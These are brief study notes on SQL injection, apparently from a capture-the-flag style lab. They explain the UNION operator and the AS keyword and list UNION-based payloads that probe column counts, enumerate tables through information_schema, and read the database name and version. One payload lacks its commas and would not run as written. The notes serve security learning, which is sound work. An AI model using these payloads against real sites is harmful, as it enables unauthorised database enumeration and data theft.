### N o T e S

---

Sometimes, we are given a database and not a login portal which is vulnerable to SQLi.

- Use of `UNION` operator.
- Use of `AS` keyword. --> It renames a coloumn or table of the query result.

### Example : Book Search database

Example of Sqli in database : 

```sql
Feeling%' UNION SELECT NULL NULL NULL --

https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'

0 UNION SELECT 1,2,database()

1 UNION SELECT @@VERSION, @@VERSION, @@VERSION, @@VERSION
1 UNION SELECT NULL, NULL, NULL, NULL
```
